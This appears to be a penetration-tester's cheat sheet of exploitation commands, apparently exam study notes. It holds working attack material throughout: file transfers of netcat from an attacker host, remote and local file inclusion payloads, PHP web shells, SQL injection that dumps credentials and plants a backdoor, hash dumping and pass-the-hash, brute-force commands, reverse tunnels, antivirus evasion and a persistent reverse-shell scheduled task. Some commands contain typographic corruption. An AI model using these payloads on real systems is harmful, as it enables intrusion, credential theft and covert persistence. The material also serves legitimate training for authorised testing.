# Exploitation
_Finding Public Exploits:_  
www.securityfocus.com/vulnerabilities    
www.exploit-db.com

`searchsploit <keyword>` #Search exploit-db by keyword  
`cp /usr/share/exploitdb/platforms/windows/remote/{643.c,646.c}` . #copy found exploit to root directory

### **Compiling** .  
`i586-mingw32msvc-gcc exploit-fixed.c -lws2_32 -o exploit.exe` #compile Windows code on Linux .      
`wine exploit.exe` #Run Windows executable on Linux

_Convert Python Exploit to Win Exe_  
#On our Windows staging host 
#Install pywin32-218.win320py2.7  
#Extract pyinstaller-2.0 
#Move python exploit into pyinstaller-2.0 directory 
#Invoke pyinstaller to convert to Exe  
`python pyinstaller.py —onefile ms11-080.py`

### **File Transfers**  
_TFTP_  
#Attacker  
`mkdir /tftp  
atftpd --daemon --port 69 /tftp  
cp /usr/share/windows-binaries/nc.exe /tftp/  `

#Victim  
`tftp -i AttackerIP GET nc.exe  `

_PS File Transfer_  
#code sequence in powershell-download file  
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1` #Bypass Execution Policy

### **Web Application Attacks**  
LFI/RFI #usually in poor php code .  
_RFI_  
`VulnParam=http://AttackerIP/evil.txt%00` #%00 null byte instructs to ignore everything after value .  
#Where evil.txt is `<?php echo shell_exec(“cat /etc/passwd”);?>`  
`$ echo ‘<?php echo shell_exec(“ifconfig”);?>’ > /var/www/evil.txt`

`$ tail -f /var/log/apache2/access.log` #track traffic from our apache web server hosting evil.txt

_LFI_   
#Contaminate the web server log with a PHP backdoor .  
`$ nc -nv TargetIP 80 ` 
`<?php echo shell_exec($_GET[‘cmd’]);?>` 

#append URL to execute command from access log file .  
`&cmd=ipconfig&VulnParam=../../../../../../xampp/apache/logs/access.log%00`

_SQL Injection_   
“`Any’ or 1=1 limit 1;#`" #any username, always true statement, limit one account, end statement while ignoring rest of needed arguments   

Error-based Enumeration Example:  
`test.php?id=1 union order by <recursive #s>` #figure out how many columns (lets assume 6 columns)  
`test.php?id=1 union select 1,2,3,4,5,6` #see where each column is on the page   
`test.php?id=1 union select 1,2,3,4,@@version,6` #use 5th column position to print server version   
`test.php?id=1 union select 1,2,3,4,user(),6` #displays current DB user into 5th column field   
`test.php?id=1 union select 1,2,3,4,table_name,6 FROM information_schema.tables` #all tables   
`union select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name=‘users’` #Extract all column names from the specific table of interest   
`union select 1,2,name,4,password,6 FROM users` #dump creds from users table   

`union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6 into OUTFILE ‘c:/xampp/htdocs/backdoor.php’` #add backdoor file to the Windows web root   
`TargetIP/backdoor.php?cmd=ipconfig` #access the uploaded backdoor    

SQLMap   
`sqlmap -u http://TargetIP —crawl=1` #sqlmap crawl web app and search for vulns   

### **Password Attacks**
`FGDUMP.exe` #with admin privs on a local machine, download and run fgdump.exe to display hashes.  
`WCE.exe / WCE64.exe -w` #run locally on a system to display cleartext admin password   

_Pass-the-Hash_   
`pth-` #displays all the tools in suite that can use a hash for authentication   
`export SMBHASH=<HashValue>` #sets the SMBHASH variable with found hash value   
`pth-winexe -U administrator% //TargetIP cmd` #pop cmd on target server with empty admin pw (using hash variable set)   

_Password Audit Tools_   
`Medusa -h TargetIP -u admin -P password-file.txt -M http -m DIR:/admin -T 20` #Medusa   
`Ncrack -v -f —user administrator -P password-file.txt rdp://TargetIP,CL=1` #Ncrack for RDP brute force   
`Hydra -l admin -P password-file.txt -v TargetIP ftp` #Hydra   

### **Tunneling/Redirection**   
#Portforwarding using rinetd
`Nano /etc/rinetd.conf`   
#Configure bindaddress (our proxy address), bind port, connectaddress and connect port   
Ex. `KaliIP 80 TargetIP 3389`   
#Targeting the proxy IP on port 80 from internal network host with only 80/443 outbound allowed will instead connect to target IP RDP.  
`/etc/init.d/rinetd restart`

_Reverse SSH Tunnel from Internal Victim to Attacker_    
#upload plink.exe to victim machine (ssh client for windows)   
`C:\>plink -l root -pw password <AttackerIP> -R 3390:127.0.0.1:3389` #tunnels local port 3389 to port 3390 on attacker machine   
#on kali, `rdesktop 127.0.0.1:3390`, will connect to 3389 on internal server   

_SSH Dynamic Port Forwarding_   
#set local listening port and tunnel traffic to any remote destination through socks proxy   
`ssh -D 8080 root@admin.megacorpone.com` #create socks4 proxy on local attack box to route traffic through dmz server   
#with proxychains forward traffic to the non-routable dmz network via the socks4 proxy   
#configure proxychains, nano /etc/proxychains.conf   
`proxychains map -p 3389 -sT -Pn InternalDMZNetwork —open`

#### Exploitation

_AV Avoidance_  
Encrypt Shell for AV Avoidance with Hyperion  
#Copy Hyperion from Windows binaries directory   
`cp /usr/share/windows-binaries/Hyperion-1.0.zip .`

#Cross compile the Hyperion source code   
`i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe`

#Invoke Hyperion and use it to protect shell   
`wine Hyperion.exe ../shell.exe ~/Desktop/crypted.exe`

_Persistent Backdoor_   
#Schedule persistent backdoor reverse payload every 10min to attacking machine.  
`C:\Windows\system32>schtasks /create /ru SYSTEM /sc MINUTE /M0 10 /tn megapwn /tr "\"C:\\Users\\mike\\Downloads\\shell.exe\""`
